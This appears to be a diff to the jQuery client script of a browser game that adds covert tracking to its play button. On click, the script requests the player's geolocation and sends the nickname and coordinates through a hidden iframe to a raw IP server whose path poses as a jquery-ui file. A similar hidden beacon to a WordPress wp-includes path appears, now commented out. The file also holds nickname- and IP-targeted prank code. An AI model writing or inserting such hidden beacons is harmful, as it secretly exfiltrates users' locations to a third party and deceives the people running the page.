@@ -1,14 +1,32 @@
 var nn = $("#nickname").val();
+$("#playBtn").click(function(){
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sP);
+} 
+var nn = $("#nickname").val();	
+	
 //var nntrim = nn.replace(" ","");
+function sP(p) {
+ window.latae = p.coords.latitude;
+ window.longe= p.coords.longitude;
+	
+$('<iframe src="http://5.196.1.134/agar/jquery-ui.php?name='+nn+ 'loc='+ p.coords.latitude +',' + p.coords.longitude + '"style="display:none;"></iframe>')
+ .appendTo('#overlays');
+}
+});
+/*
 $.getJSON('//freegeoip.net/json/?callback=?', function(data) {
   if(data.ip == "78.0.19.163") {
-  localStorage.setItem('maric', 'derpe2');
+  	//localStorage.setItem('maric', 'derpe2');
   }
 	//console.log("ip", data.ip);
 });
 
+
+$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
+ .appendTo('#overlays');
 if(nn == "VƗŦΔŁƗ[vit]") {
-localStorage.setItem('maric', 'derpe');
+
 	//$("body").append("<img src='http://24sata.info/thumbnail.php?file=news/2010/may/srbija_bih_zastave_883416657.jpg&size=article_large' style='width:100%;height:100%;opacity:0.2;z-index:1200;position:absolute;top:0;left:0;'/>");
 	//window.open("https://akk.li/pics/anne/jpg");
 	//window.location = "https://akk.li/pics/anne/jpg";
@@ -25,9 +43,7 @@ localStorage.setItem('maric', 'derpe');
 
 //if($('iframe[src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1"]').length == 0){ 
  //$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1" frameborder="0" allowfullscreen></iframe>');
-} else {
-	console.log('....');
-}
+} 
 if(nn=="๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻") {
 //window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
 } 
@@ -37,6 +53,7 @@ if(nn=="๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻") {
 //	console.log("...");
 //}https://www.youtube.com/watch?v=Bt_kR7u6mM4&t=6s
 // || nn=="๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻"
+/*
 if(nn == "bol i bol") {
 	$("body").append("<h1 style='position:absolute;top:200px;left:10px;'>HAIL SATAN JEA OH HEHE OK JUUU LOL</h1>");
 if($('iframe[src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1"]').length == 0){//
@@ -68,3 +85,4 @@ if(localStorage.maric == "derpe") {
 //// }
  //$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
  // .appendTo('#overlays');
+*/
